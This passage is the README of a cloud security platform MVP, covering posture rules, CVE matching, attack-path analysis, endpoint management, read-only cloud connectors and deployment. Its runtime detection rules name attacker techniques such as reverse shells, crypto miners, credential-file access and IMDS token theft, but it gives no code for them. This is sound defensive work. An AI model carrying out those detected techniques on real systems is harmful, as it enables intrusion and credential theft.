# CloudSecurity: runtime-first CNAPP (MVP)

A cloud security platform MVP inspired by runtime-first CNAPPs such as Upwind. It combines:

- **Asset inventory**: Azure (VMs, VM scale sets, storage accounts, AKS clusters and pods, SQL, NSGs, identities, key vaults, function apps, subscriptions), AWS (accounts, EC2, security groups, S3, EKS, RDS, IAM users/roles, KMS, Lambda, CloudTrail) and GCP (projects, Compute Engine, VPC firewall rules, Cloud Storage, GKE, Cloud SQL, service accounts, Cloud KMS, Cloud Functions, Cloud Run), with region, tags, internet exposure, data sensitivity and relationships.
- **Posture management (CSPM)**: a declarative rules engine with 87 Azure rules (CIS Azure, CIS AKS, Microsoft cloud security benchmark), 24 AWS rules (CIS AWS Foundations, CIS EKS, AWS FSBP) and 23 GCP rules (CIS GCP Foundations, CIS GKE). Each finding has a status of open, resolved or suppressed.
- **Vulnerabilities with runtime context**: real CVE matching for **laptops** (the endpoint agent's installed software and OS, matched against the NVD CVE API by CPE through a curated mapping of ~50 common enterprise products) and **Linux servers/VMs** (the runtime sensor's package inventory, matched with OSV.dev for Debian, Ubuntu, Alpine, Rocky, AlmaLinux, RHEL and PyPI), with CISA KEV and FIRST EPSS exploit context. Workload CVEs are ranked by a risk score that combines CVSS with whether the package is loaded at runtime, internet exposure, sensitive-data reach and exploit availability; the UI shows a **noise-reduction** stat. Software that cannot be matched reliably is listed as "not checked" instead of guessed. See [docs/VULNERABILITIES.md](docs/VULNERABILITIES.md).
- **Runtime threat detection (CDR)**: a runtime event feed plus 8 detection rules (reverse shell, crypto miner, known-malicious IP, shell in a container, privilege escalation, credential-file access, unexpected outbound connection, IMDS token theft). Each rule maps to MITRE ATT&CK, and each alert has an event timeline.
- **Cloud exposure**: one view of every internet-reachable asset across Azure, AWS and GCP, with how it is reached (public IP, load balancer, Application Gateway, Azure Firewall DNAT, PaaS public endpoint), effective ports evaluated like the cloud does (NSG priorities, deny and default rules, NIC + subnet), protecting controls, private endpoints and linked findings / vulnerabilities / attack paths. See [Cloud exposure](#cloud-exposure).
- **Attack paths**: a risk graph covering Internet → exposed resource → workload → identity → sensitive data, with the top paths ranked. *Confirmed* paths carry an exploitable weakness (in-use vulnerability, high-risk misconfiguration, or an NSG / security group / firewall rule opening SSH, RDP or all ports on the entry point); *exposure* paths are the same chains without a confirmed weakness, scored lower. See [Attack paths](#attack-paths).
- **Dashboard**: overall risk score, findings by severity, top risks, alerts over time and a compliance summary.
- **Simulated data mode (on by default)**: a seeded "Contoso" environment across three Azure-style subscriptions, plus a background simulator that emits live runtime events.
- **Real cloud posture connectors (opt-in, read-only)**: Azure (azure-mgmt-* SDKs), AWS (boto3, SecurityAudit + ViewOnlyAccess, cross-account roles) and GCP (Google REST APIs via google-auth, Viewer + Security Reviewer). A "Run scan" button merges the results into the same model with `source="azure"`, `"aws"` or `"gcp"`; see [Cloud connectors](#cloud-connectors-read-only).
- **Login, sessions and role-based access control**: every API endpoint and page requires sign-in (viewer, analyst or admin roles), with an admin Users page and an audit log. See [Authentication & access control](#authentication--access-control).
- **IT asset lifecycle**: hardware records for every agent-enrolled device plus monitors, phones, docks and laptops without an agent; assignment and chain-of-custody history, offboarding with retrieval tracking and overdue reminders, warranties, disposal with wipe/destruction certificates, idle-device detection, CSV import/export. See **[docs/ASSET_MANAGEMENT.md](docs/ASSET_MANAGEMENT.md)**.
- **Multi-tenant organisations**: one deployment serves many organisations with strict data isolation (enforced centrally in the ORM, composite keys for cloud resource ids, per-organisation agent, sensor and cloud credentials). Existing installations are migrated into a default organisation automatically. See **[docs/MULTI_TENANCY.md](docs/MULTI_TENANCY.md)**.
- **Pluggable connectors** and a documented **runtime sensor ingest API** for the runtime sensor.

## Architecture

```mermaid
flowchart LR
  subgraph Sources
    SIM[Simulated connector<br/>seed + live event simulator]
    AZ[Azure connector<br/>read-only, Reader role]
    AWS[AWS connector<br/>read-only, SecurityAudit + ViewOnlyAccess]
    GCP[GCP connector<br/>read-only, Viewer + Security Reviewer]
    SENSOR[Runtime sensor<br/>sensor/, procfs + optional eBPF]
    AGENT[Endpoint agent<br/>endpoint-agent/, Windows + macOS]
  end
  subgraph Backend [FastAPI backend]
    ING[Ingest service]
    PR[Posture rules engine]
    DR[Detection rules engine]
    RS[Risk scoring]
    AP[Attack path engine]
    DB[(SQLite or PostgreSQL<br/>via SQLAlchemy + Alembic)]
    API[REST API /api/*]
  end
  UI[React + Vite UI]

  SIM --> ING
  AZ --> ING
  AWS --> ING
  GCP --> ING
  SENSOR -- POST /api/runtime/events --> DR
  AGENT -- "/api/agent/* (per-device credential, pull)" --> DB
  ING --> PR --> DB
  ING --> RS --> DB
  DR --> DB
  DB --> AP --> API
  DB --> API
  API --> UI
```

```
backend/
  app/
    main.py              FastAPI app, lifespan (seeding + simulator + bootstrap admin)
    config.py            env-var settings
    auth.py              password hashing, sessions, CSRF, RBAC dependencies, audit helper
    cli.py               `python -m app.cli create-user | reset-password | migrate`
    db.py, locks.py      engine (SQLite/PostgreSQL), migrations, advisory-lock leader election
    logging_setup.py     text / JSON logging
    models.py            Asset, Relationship, Finding, Vulnerability, RuntimeEvent, Alert, ScanRun,
                         User, UserSession, AuditLog
    schemas.py           Pydantic v2 schemas (includes the runtime event schema)
    engine/
      posture.py         declarative CSPM rules + CIS mappings (Azure)
      posture_azure.py   Azure Firewall, private endpoint, App Service and managed database rules
      nsg.py             inbound rule evaluator (priority, deny, defaults, ASGs, NIC + subnet)
      eol.py             bundled end-of-life table (endoflife.date) for runtimes and DB engines
      posture_aws.py     AWS rules (CIS AWS Foundations, CIS EKS, AWS FSBP)
      posture_gcp.py     GCP rules (CIS GCP Foundations, CIS GKE)
      detection.py       CDR detection rules + MITRE mapping
      risk.py            vulnerability risk score, noise reduction, overall risk score
      attack_paths.py    graph traversal and path scoring
    connectors/
      base.py            Connector interface + records
      simulated.py       seed generator + attack scenarios
      azure.py           read-only Azure scanner (ReadOnlyClient guard)
      aws.py             read-only AWS scanner (ReadOnlyAwsClient guard, boto3)
      gcp.py             read-only GCP scanner (ReadOnlyGcpClient guard, REST + google-auth)
    services/            ingest, runtime, scans, simulation, analytics
    vulnmatch/           real CVE matching: NVD CPE (laptops), OSV (Linux packages), KEV/EPSS, worker
    api/                 routers
  migrations/            Alembic migrations (PostgreSQL)
  gunicorn.conf.py       production server settings
  tests/                 pytest suite (API, auth/RBAC, engines, DB, production config, sensor end-to-end)
frontend/                React + Vite + TypeScript + Tailwind + Recharts (nginx/ = production proxy config)
infra/                   Bicep (main.bicep + modules/), setup.sh (one-time Azure/GitHub setup), deploy.sh (CD step), tests
endpoint-agent/          Go endpoint agent for Windows/macOS: inventory, posture, allow-listed remote actions,
                         service install, packaging (see docs/DEVICE_MANAGEMENT.md)
docs/DEPLOY_AZURE.md     Azure deployment guide
docs/DEVICE_MANAGEMENT.md  device management: agent architecture, enrollment, data collected, security model
docs/AGENT_UPDATES.md    signed agent auto-update: release key, rollout rings, automatic rollback
docs/DEVICE_SCRIPTS.md   approved (signed) device scripts; ADR-0001 explains why the agent stays bounded
device-scripts/          the reviewed script library (signed by .github/workflows/device-scripts-release.yml)
docs/NOTIFICATIONS.md    alert notifications: Teams, Slack, email, signed webhooks, rules
docs/ASSET_MANAGEMENT.md IT asset lifecycle: asset records, custody, offboarding, disposal, CSV, notifications
docs/AUTH.md             MFA (TOTP) and Microsoft Entra ID sign-in, break-glass accounts
docs/VULNERABILITIES.md  CVE matching: sources, CPE mapping table, limits, egress, adding mappings
docs/MULTI_TENANCY.md    organisations: data model, isolation guarantees, machine credentials, platform owners
scripts/smoke_test.py    end-to-end smoke test (CI and the deploy workflow)
scripts/agent_e2e.py     endpoint agent <-> backend end-to-end test (CI on Windows and macOS runners)
docker-compose.yml       local stack (SQLite); docker-compose.postgres.yml adds PostgreSQL
```

## Device management (endpoints)

Enroll company **Windows 10/11 and macOS** laptops and desktops with our own lightweight agent (`endpoint-agent/`, a single Go binary): hardware/OS inventory, security posture (disk encryption, firewall, antivirus, screen lock, OS updates, SIP/Gatekeeper, Secure Boot/TPM, local admins), installed software, derived device issues, and a small allow-list of audited remote actions (re-check posture, collect agent logs, lock device, restart agent, change check-in interval, **lost mode** with a message on the sign-in/lock screen, **remote wipe** for Windows devices that opted in at install time, and **approved scripts**). The agent only makes outbound HTTPS requests, authenticates with a per-device credential, and never runs arbitrary commands: scripts must be reviewed in `device-scripts/` and signed with a dedicated key the server never holds ([docs/DEVICE_SCRIPTS.md](docs/DEVICE_SCRIPTS.md), [ADR-0001](docs/ADR-0001-signed-device-scripts.md)). Remote wipe and medium/high-risk scripts need a **second admin's approval** (Approvals page). Admins download a pre-configured MSI/PKG installer (or create enrollment tokens for manual installs) from **Devices → Enroll devices**. See **[docs/DEVICE_MANAGEMENT.md](docs/DEVICE_MANAGEMENT.md)** for the walkthrough, the data collected, the security model and the packaging/signing steps. Agents **update themselves** to releases you import and roll out in rings (Pilot → Broad → All, percentages, pins), with automatic rollback; releases must be signed with an Ed25519 release key that never lives on the CNAPP server: **[docs/AGENT_UPDATES.md](docs/AGENT_UPDATES.md)**.

## IT asset lifecycle

**IT assets** keeps one record per physical asset: every enrolled agent device gets one automatically (serial, make and model come from the agent inventory), and IT adds the rest (monitors, phones, docks, laptops not yet enrolled) by hand or by CSV. Assign assets to people, track every assignment, return and status change on a custody timeline, mark leavers so their assets go to *retrieval pending* with a due date, record disposal with a wipe/destruction certificate, and get notified about overdue retrievals, expiring warranties and devices that stopped checking in. Viewers read, analysts and admins edit, admins manage settings; everything is audited. See **[docs/ASSET_MANAGEMENT.md](docs/ASSET_MANAGEMENT.md)**.

## Deploy to Azure

A production deployment on **Azure Container Apps + Azure Database for PostgreSQL + Key Vault**, provisioned with Bicep and deployed by a GitHub Actions workflow that signs in with OIDC (no stored Azure secrets), is described step by step in **[docs/DEPLOY_AZURE.md](docs/DEPLOY_AZURE.md)**: one-time `infra/setup.sh`, then run the *Deploy to Azure* workflow. Estimated cost for the demo sizing is roughly **US$35-45/month**; `az group delete` removes everything.

## Deploy on-prem (single Ubuntu server)

Run it on your own **Ubuntu Server 24.04** box on the internal network/VPN: Docker Compose (PostgreSQL 16, API, nginx with TLS), an internal CA or your own certificate, pull-based updates from GHCR with automatic rollback, nightly backups and a firewall, all driven by one script, `cnapp-ctl`. Start with **[deploy/onprem/QUICKSTART.md](deploy/onprem/QUICKSTART.md)**; the full guide is **[docs/DEPLOY_ONPREM.md](docs/DEPLOY_ONPREM.md)**.

## Quick start

### With Docker

```bash
cp .env.example .env        # then set ADMIN_EMAIL and ADMIN_PASSWORD (12+ characters)
docker compose up --build
```

The compose stack runs the same production images as Azure (gunicorn with uvicorn workers, unprivileged nginx). To use PostgreSQL instead of SQLite, as in production:

```bash
export POSTGRES_PASSWORD=$(openssl rand -hex 16)   # any local-only value
docker compose -f docker-compose.yml -f docker-compose.postgres.yml up --build
```

To also run the runtime sensor against the Docker host (Linux only), set `INGEST_API_TOKEN` in `.env` and start the optional profile:

```bash
docker compose --profile sensor up --build
```

- UI: http://localhost:5173 (sign in with `ADMIN_EMAIL` / `ADMIN_PASSWORD`)
- API docs (after signing in to the UI; cookies are shared across localhost ports): http://localhost:8000/api/docs

### Without Docker

Backend (Python 3.11+):

```bash
cd backend
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements-dev.txt
# First admin (only used while the users table is empty). Or use the CLI below.
export ADMIN_EMAIL=you@example.com ADMIN_PASSWORD='choose-a-long-passphrase'
uvicorn app.main:app --reload --port 8000
```

Frontend (Node 22.15+; the ESLint config uses `module.registerHooks`), in a second terminal:

```bash
cd frontend
npm install
npm run dev                 # http://localhost:5173 (proxies /api to :8000)
```

Run the tests and the production build:

```bash
cd backend && pytest && ruff check .
cd frontend && npm run lint && npm run build
```

The backend suite runs on in-memory SQLite by default. To run it against PostgreSQL as CI does (the database is wiped repeatedly):

```bash
TEST_DATABASE_URL=postgresql://cnapp:<password>@localhost:5432/cnapp_test pytest
```

### Database migrations

SQLite (local default) keeps the zero-setup behaviour: tables are created on startup. PostgreSQL is managed by Alembic migrations in `backend/migrations/`, applied automatically on startup (`DB_AUTO_MIGRATE=true`, under a PostgreSQL advisory lock so several replicas can start together) or explicitly with `python -m app.cli migrate`. After changing `app/models.py`, add a migration:

```bash
cd backend
DATABASE_URL=postgresql://... alembic revision --autogenerate -m "describe the change"
```

`tests/test_database.py` fails if the migrations and the models drift apart.

On first start, simulated mode seeds the database (`backend/cnapp.db`) and backfills 24 hours of runtime events. To start fresh, delete the DB file.

## Configuration (env vars)

| Variable | Default | Description |
|---|---|---|
| `APP_ENV` | `development` | `production` enables the [production guardrails](docs/DEPLOY_AZURE.md#production-settings): refuses to start if insecure, JSON logs, HSTS, no API docs |
| `DATABASE_URL` | `sqlite:///./cnapp.db` | SQLAlchemy URL. `postgresql://user:pass@host:5432/db?sslmode=verify-full` uses psycopg 3 |
| `DB_AUTO_MIGRATE` | `true` | Apply schema migrations on startup (Alembic on PostgreSQL, `create_all` on SQLite) |
| `DB_POOL_SIZE` / `DB_MAX_OVERFLOW` | `5` / `5` | PostgreSQL connection pool per worker process |
| `LOG_FORMAT` / `LOG_LEVEL` | `text` (`json` in production) / `INFO` | Log output format and level |
| `WEB_CONCURRENCY` | `2` | gunicorn worker processes in the container image |
| `SIMULATION_MODE` | `true` | Seed the simulated environment when the DB is empty |
| `SIMULATOR_ENABLED` | `true` | Run the background runtime-event simulator |
| `SIMULATOR_INTERVAL_SECONDS` | `15` | Seconds between simulator ticks |
| `SIMULATOR_ATTACK_PROBABILITY` | `0.05` | Chance that a tick plays out an attack scenario |
| `SEED` | `42` | Deterministic seed for generated data |
| `INGEST_API_TOKEN` | *(empty)* | Bearer token required on `POST /api/runtime/events` (the sensor's `SENSOR_API_TOKEN`) for the **default organisation**; other organisations create their own ingest tokens (`/api/organization/ingest-tokens`). Ingest is **fail-closed**: with no token at all it returns 503. `RUNTIME_INGEST_TOKEN` is accepted as a legacy alias |
| `INGEST_ALLOW_UNAUTHENTICATED` | `false` | Local development only: accept sensor events without a token |
| `MAX_REQUEST_BYTES` | `1048576` | Request body limit for every endpoint (413 above it) |
| `MAX_EVENTS_PER_REQUEST` | `1000` | Max events per ingest request |
| `CORS_ORIGINS` | `http://localhost:5173` | Comma-separated allowed origins |
| `ADMIN_EMAIL` / `ADMIN_PASSWORD` | | Create this admin (of the default organisation) on startup **only if no users exist**. Password must be 12+ characters. There is no default password |
| `DEFAULT_ORG_NAME` | `Default organisation` | Name given to the default organisation when it is created (existing data is migrated into it); rename it later in the console. See [docs/MULTI_TENANCY.md](docs/MULTI_TENANCY.md) |
| `PLATFORM_ADMIN_EMAILS` | | Comma-separated platform owners (manage organisations), in addition to `python -m app.cli platform-admin EMAIL` |
| `ADMIN_NAME` | `Administrator` | Display name for the bootstrap admin |
| `COOKIE_SECURE` | `true` | Mark the session cookie `Secure`. Leave on for https and Codespaces; see [Cookies](#session-cookie-settings) |
| `SESSION_MAX_AGE_HOURS` | `8` | Absolute session lifetime |
| `SESSION_IDLE_MINUTES` | `30` | Sign out after this long without any API activity |
| `SESSION_COOKIE_NAME` | `cnapp_session` | Session cookie name |
| `LOGIN_MAX_FAILURES` / `LOGIN_LOCKOUT_MINUTES` | `5` / `15` | Lock an account for 15 minutes after 5 consecutive wrong passwords |
| `LOGIN_RATE_LIMIT` / `LOGIN_RATE_WINDOW_SECONDS` | `20` / `300` | Max login attempts per client IP per window (429 above it) |
| `TRUST_PROXY_HEADERS` | `false` | Take the client IP from the right-most `X-Forwarded-For` entry. Only enable when the backend is reachable *only* through your proxy |
| `TRUSTED_PROXY_CIDRS` | | With `TRUST_PROXY_HEADERS`: honour `X-Forwarded-For` only from these proxies and use the right-most address that is not one of them (several proxy hops, e.g. Container Apps ingress + nginx) |
| `SESSION_SECRET` | | Key for the stored session-token digests (HMAC-SHA256). Required (32+ chars) in production; rotating it signs everyone out |
| `MFA_ENCRYPTION_KEY` | | Key encrypting TOTP secrets at rest (32+ chars; comma-separate to rotate). Required in production. See [docs/AUTH.md](docs/AUTH.md) |
| `MFA_REQUIRED_ROLES` | | Roles that must enrol in MFA at their next login, e.g. `admin,analyst` |
| `ENTRA_TENANT_ID` / `ENTRA_CLIENT_ID` | | Enable "Sign in with Microsoft"; other `ENTRA_*` and `AUTH_PASSWORD_LOGIN_*` settings in [docs/AUTH.md](docs/AUTH.md#settings-reference) |
| `API_DOCS_ENABLED` | `true` (`false` in production) | Serve the interactive API docs at all |
| `API_DOCS_PUBLIC` | `false` | Serve `/api/docs` and `/api/openapi.json` without login |
| `HSTS_MAX_AGE` | `31536000` | `Strict-Transport-Security` max-age sent in production (0 disables) |
| `ASSET_DEFAULT_CURRENCY` / `ASSET_IDLE_DAYS` / `ASSET_WARRANTY_WARNING_DAYS` / `ASSET_RETRIEVAL_DUE_DAYS` | `NGN` / `30` / `30` / `7` | IT asset defaults (admins can override them in the UI); other `ASSET_*` settings in [docs/ASSET_MANAGEMENT.md](docs/ASSET_MANAGEMENT.md#configuration) |
| `AZURE_TENANT_ID` | | Entra ID tenant |
| `AZURE_CLIENT_ID` | | Service principal app ID |
| `AZURE_CLIENT_SECRET` | | Service principal secret |
| `AZURE_SUBSCRIPTION_IDS` | | Comma-separated subscriptions to scan |
| `AZURE_USE_DEFAULT_CREDENTIAL` | `false` | Use `DefaultAzureCredential` (az login, managed identity) when no secret is set |
| `AZURE_AUTH_MODE` | `auto` | `auto`, `client_secret`, `managed_identity` or `default`. `auto` uses the client secret if set, else the managed identity if `AZURE_MANAGED_IDENTITY_CLIENT_ID` is set, else `DefaultAzureCredential` if enabled |
| `AZURE_MANAGED_IDENTITY_CLIENT_ID` | | Client ID of the user-assigned managed identity to scan with (set by the Azure deployment) |
| `SCAN_SCHEDULE_ENABLED` | `true` | Scan every configured cloud connector automatically ([Scheduled scans](#scheduled-scans)). Default for the console setting |
| `SCAN_INTERVAL_HOURS` | `6` | Hours between scheduled scans of a connector, fractions allowed (`0.25` to `168`; outside that range the API refuses to start). Default for the console setting |
| `SCAN_STARTUP_DELAY_SECONDS` | `120` | Wait after a (re)start before the first scheduled scan (`0` to `3600`) |
| `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` | | Access key of the dedicated read-only IAM user ([docs/CONNECT_AWS.md](docs/CONNECT_AWS.md)) |
| `AWS_USE_DEFAULT_CREDENTIALS` | `false` | Use boto3's default credential chain (instance role, profile, SSO) when no access key is set |
| `AWS_AUTH_MODE` | `auto` | `auto`, `access_key` or `default` |
| `AWS_ROLE_ARNS` / `AWS_EXTERNAL_ID` | | Read-only roles to assume in other accounts (comma-separated) and their external ID |
| `AWS_REGIONS` | *(all enabled)* | Regions to scan (comma-separated) |
| `AWS_HOME_REGION` | `us-east-1` | Region for IAM/STS/S3 listing (`us-gov-west-1`, `cn-north-1` in other partitions) |
| `GCP_CREDENTIALS_FILE` | | Absolute path of the service account key / workload identity federation config ([docs/CONNECT_GCP.md](docs/CONNECT_GCP.md)); on-prem set by `cnapp-ctl gcp-key install` |
| `GCP_USE_DEFAULT_CREDENTIALS` | `false` | Use Application Default Credentials when no file is set |
| `GCP_PROJECT_IDS` / `GCP_ORGANIZATION_ID` | | Projects to scan (comma-separated) and/or every active project of an organization |

## Connecting a real Azure environment (read-only)

**Deployed on Azure:** the scanner uses the backend's managed identity, so there is no secret at all. Grant it Reader with `infra/setup.sh --grant-scanner <subscription-id>` and redeploy; see [Enable the Azure scanner](docs/DEPLOY_AZURE.md#enable-the-azure-scanner). The steps below are for running the scanner **locally** with a service principal secret.

1. Create a least-privilege service principal with the built-in **Reader** role:

```bash
az login
SUB_ID=$(az account show --query id -o tsv)

az ad sp create-for-rbac \
  --name cloudsecurity-cnapp-reader \
  --role Reader \
  --scopes /subscriptions/$SUB_ID
# Output: appId -> AZURE_CLIENT_ID, password -> AZURE_CLIENT_SECRET, tenant -> AZURE_TENANT_ID
```

2. To scan more subscriptions, grant Reader on each one:

```bash
az role assignment create --assignee <appId> --role Reader --scope /subscriptions/<other-sub-id>
```

3. Optional: grant Reader at a management group to cover many subscriptions:

```bash
az role assignment create --assignee <appId> --role Reader \
  --scope /providers/Microsoft.Management/managementGroups/<mg-id>
```

4. Put the values in `.env`, which is git-ignored, and restart the backend:

```bash
AZURE_TENANT_ID=<tenant>
AZURE_CLIENT_ID=<appId>
AZURE_CLIENT_SECRET=<password>
AZURE_SUBSCRIPTION_IDS=<sub-id-1>,<sub-id-2>
```

5. Open **Connectors & scans** and click **Run scan**, or call `POST /api/scans` with `{"connector":"azure"}`. Results appear in the inventory and findings with `source=azure`. A re-scan resolves findings that now pass.

### Scheduled scans

Besides **Run scan**, the backend scans every configured cloud connector on a schedule: every
`SCAN_INTERVAL_HOURS` (default **6 h**), one scan run per connector. Unconfigured connectors are skipped, and so is
the simulated connector unless `SIMULATION_MODE` is on. Connectors added later (e.g. AWS, GCP) are picked up
automatically once configured.

- **One scheduler per deployment.** It runs inside the backend and uses the same advisory-lock leader election as the
  simulator and the notification dispatcher, so several gunicorn workers / replicas never scan twice.
- **Timing comes from the database**: a connector is due when its last *scheduled* scan started at least one interval
  ago. A restart neither re-scans everything nor loses the schedule; if scans are overdue at startup they run once,
  after `SCAN_STARTUP_DELAY_SECONDS` (120 s).
- **Manual scans** keep working and do not move the schedule (they are recorded with trigger `manual`; only
  scheduled runs anchor the next one).
- **No overlap**: if a scan of that connector (manual or scheduled) is still running when the next scheduled one is
  due, that slot is skipped, logged and shown as a `skipped` run; the next attempt is one interval later. A run left
  `running` by a backend that died is marked failed after 10 minutes.
- **Failures** are recorded on the scan run (message + errors) and raise a **Cloud scans** notification (source
  `scan`, event `failed`, attribute `trigger=scheduled`). Add a notification rule for that source to get them in
  Teams / Slack / email.
- **Console**: **Connectors & scans** shows "Scheduled every 6 h · last scan … · next scan …" per connector. Admins can
  turn the schedule off/on and change the interval there; the change is stored in the database (overriding the env
  defaults until **Reset to defaults**), applies within a minute without a restart, and is audited
  (`scan_schedule_updated`). API: `GET /api/scan-schedule` (any signed-in user), `PUT /api/scan-schedule` (admin;
  `{"enabled": false}`, `{"interval_hours": 12}`, `null` resets a field to the env default).

What the scanner checks (87 rules; full coverage table, exposure model and permissions in **[docs/AZURE_COVERAGE.md](docs/AZURE_COVERAGE.md)**):

| Resource | Rules |
|---|---|
| Storage | public blob access, HTTPS-only, minimum TLS, public access despite private endpoint |
| NSGs | SSH / RDP / all ports open to the internet (rules evaluated by priority with Deny and default rules), management ports open to public ranges only |
| VMs / scale sets | public IPs; no ADE, encryption-at-host or CMK |
| Azure Firewall | DNAT to SSH/RDP/WinRM or database ports from any source, threat intelligence off, classic rules without policy, any-to-any network rule, Premium without IDPS |
| SQL / SQL Managed Instance | public access, auditing, allow-all firewall, minimum TLS, private endpoint; MI public endpoint open through the subnet NSG, Entra-only auth |
| Key Vault | soft delete, purge protection, reachable from all networks, private endpoint |
| App Service (web + function apps) | HTTPS only, TLS 1.2, FTP, HTTP/2, managed identity, remote debugging, SCM site restricted, authentication on internet-facing apps, **end-of-life runtime**, client certificates, private endpoint |
| PostgreSQL / MySQL flexible server | allow-all firewall, Azure services rule, TLS enforcement, minimum TLS, geo-redundant backup, Entra auth, **engine end-of-life**, retired Single Server, private endpoint |
| Cosmos DB | all networks, key (local) auth, minimum TLS, backup redundancy, private endpoint |
| Azure Cache for Redis | non-TLS port, minimum TLS, all networks, access-key auth, end-of-life version, private endpoint |
| AKS | RBAC disabled, public API server without authorized IP ranges |
| Identities / subscription | Owner or Contributor at subscription scope; owner and contributor counts |

Relationships (they feed [attack paths](#attack-paths)):

- **NSG → VM / scale set** (`protects`): NIC-level NSGs and the NSG of the subnet each NIC (or scale-set NIC configuration) sits in, with `levels: ["nic"]` / `["subnet"]` on the edge.
- **Internet exposure**: a VM or scale set is internet-exposed when the internet can reach at least one port: through a public IP on a NIC (Standard public IPs without an NSG are closed by default), a public load balancer rule / inbound NAT rule / NAT pool (backend ports the NSGs admit), a public application gateway (backend by NIC, IP or FQDN) or an **Azure Firewall DNAT** rule (to the NIC, to an internal load balancer's backends or to a private endpoint). Inbound NSG rules are evaluated like Azure does: by priority, first match wins, Allow and Deny, default rules, service tags, application security groups, subnet NSG then NIC NSG. A public IP that no rule admits is recorded as `exposure_blocked`, not as exposure. Effective ports are stored as `effective_ports`; ranges reachable only from listed public addresses as `partial_exposure`.
- **Firewall DNAT** (`connects_to`): `azure_firewall -> VM / scale set / PaaS resource` with the translated port; the backend lists the firewall in `exposed_only_via`, so its attack paths start at the firewall.
- **Private endpoints**: `vnet -contains-> private_endpoint -connects_to-> target`. A resource with public network access disabled and only private endpoints is not internet-exposed.
- **Data-plane access** (`has_access`): Cosmos DB data roles, Redis access policies, Entra administrators of SQL / SQL MI / PostgreSQL / MySQL, and ARM roles that reach their data (Owner, Contributor, DocumentDB Account Contributor, Cosmos DB Account Reader, Redis Cache Contributor, SQL Managed Instance Contributor).
- **Workload → identity** (`uses_identity`): system- and user-assigned identities of VMs, scale sets, function apps and AKS clusters, plus the AKS **kubelet** identity (what pods on the nodes can get tokens for).
- **Identity → data store** (`has_access`): RBAC role assignments at resource, resource-group, subscription or management-group scope whose role reaches data (Owner, Contributor, `Storage * Data *`, Storage Account Contributor, `Key Vault *` except Key Vault Reader, `SQL *`) create edges to the storage accounts, key vaults and SQL servers in scope. Role names (built-in and custom) are resolved with `role_definitions.list`; custom role *permissions* are not interpreted. Fan-out is capped at 50 stores per assignment, sensitive stores first; the rest is counted in the identity's `data_access_truncated` property. **Key Vault access policies** (vaults not in RBAC mode) granting `get` / `all` / `decrypt` / `unwrapKey` / `sign` / `export` on secrets, keys or certificates also create `has_access` edges.

Data stores are marked sensitive through tags such as `data-classification`, `classification`, `sensitivity` or `data` (for example `data_classification=confidential`). Key vaults and databases (SQL, SQL MI, PostgreSQL, MySQL, Cosmos DB, Redis) are always treated as sensitive.

**Read-only guarantee:** every SDK client is wrapped in `ReadOnlyClient`, which only allows `list*` and `get*` operations and raises `ReadOnlyViolation` on anything else (`begin_*`, `create*`, `update`, `delete`, ...). Tests enforce this, and the Reader role enforces it again on the Azure side.

## Cloud connectors (read-only)

| Connector | Library | Least-privilege access | Setup |
|---|---|---|---|
| `azure` | azure-identity + azure-mgmt-* | built-in **Reader** role | [above](#connecting-a-real-azure-environment-read-only), [docs/DEPLOY_AZURE.md](docs/DEPLOY_AZURE.md#enable-the-azure-scanner) |
| `aws` | boto3 | AWS managed policies **SecurityAudit** + **ViewOnlyAccess** (IAM user, instance role, or a role assumed in each account with an external ID) | **[docs/CONNECT_AWS.md](docs/CONNECT_AWS.md)** |
| `gcp` | google-auth + the Google Cloud REST APIs | **roles/viewer** + **roles/iam.securityReviewer** on the projects or the organization | **[docs/CONNECT_GCP.md](docs/CONNECT_GCP.md)** |

All three work the same way:

- **Configured check:** each connector's `is_configured()` is true once credentials and a scope (subscriptions / an access key or role / projects or an organization) are set. `GET /api/health` reports `azure_configured`, `aws_configured` and `gcp_configured`; `GET /api/connectors` lists each connector with its scope, regions, last scan and the accounts/projects found.
- **Scanning:** **Connectors & scans → Run scan** (or `POST /api/scans` with `{"connector": "aws"}`) runs the connector through `app/services/scans.py::start_scan`, the single entry point also used for scheduled scans. One scan per connector runs at a time (advisory lock).
- **One model:** assets, relationships and findings land in the same inventory, findings, attack paths and dashboard with `source="aws"` / `"gcp"` (`provider` likewise). Inventory and Findings have a **Cloud** filter; the Azure subscription, AWS account or GCP project is the asset's `subscription_id`.
- **Partial results:** throttling is retried (botocore adaptive retries; exponential backoff on HTTP 429/5xx for Google), lists are paginated, and a failing account, project, region or service is recorded in the scan's errors (shown under **Scan history**) while the rest of the scan continues. GCP APIs that are not enabled in a project are skipped.
- **Read-only guard:** AWS clients are wrapped in `ReadOnlyAwsClient` (only `describe_*` / `list_*` / `get_*`, plus `generate_credential_report`; S3 object reads, Lambda code, SSM parameters, secrets, EC2 password data and `meta` are blocked). Every Google request goes through `ReadOnlyGcpClient` (only `get*` / `list*` / `aggregatedList` / `search*` methods, HTTP GET except the read-only `getIamPolicy` POST, only `*.googleapis.com`; object and secret reads and token minting are blocked). Tests enforce both, and the IAM roles enforce it again on the cloud side.
- **Network:** the server needs outbound HTTPS (443) to `*.amazonaws.com` (AWS) and `*.googleapis.com` + `oauth2.googleapis.com` (GCP). Behind a proxy set `HTTPS_PROXY` (and `NO_PROXY`) in `/opt/cnapp/cnapp.env`; both SDKs honour it.

What the AWS scanner checks (rule IDs `AWS-*`): root MFA and root access keys, password policy length, console users without MFA, access keys older than 90 days, `*:*` admin policies on users and roles; public S3 buckets, Block Public Access, TLS-only bucket policies; EC2 instances with SSH/RDP open to the internet, IMDSv1; security groups open on 22/3389 or all ports, default security group in use; public, unencrypted or unbacked-up RDS; public EKS endpoints, EKS audit logging; KMS key rotation; multi-region CloudTrail, log file validation; Lambda function URLs without auth. Attack paths follow internet → exposed EC2 (via its security group) → instance role with admin / S3 / RDS access → sensitive S3 bucket or RDS database.

What the GCP scanner checks (rule IDs `GCP-*`): service accounts with Owner/Editor/*Admin, user-managed keys older than 90 days, `allUsers` on the project, project-wide Service Account User / Token Creator, too many Owners; firewall rules open on 22/3389/all ports; VMs with external IPs or the default service account with full API scope; public buckets, uniform bucket-level access; GKE legacy ABAC, public control plane, public nodes, Workload Identity; Cloud SQL open to 0.0.0.0/0, public IP, SSL, backups; KMS rotation; unauthenticated Cloud Run services and Cloud Functions. Attack paths follow internet → exposed VM (firewall) → its service account (Editor, Storage/SQL roles, bucket IAM) → sensitive bucket or Cloud SQL.

## Authentication & access control

Every `/api/*` endpoint requires a signed-in user, except:

- `GET /api/health` (liveness probe),
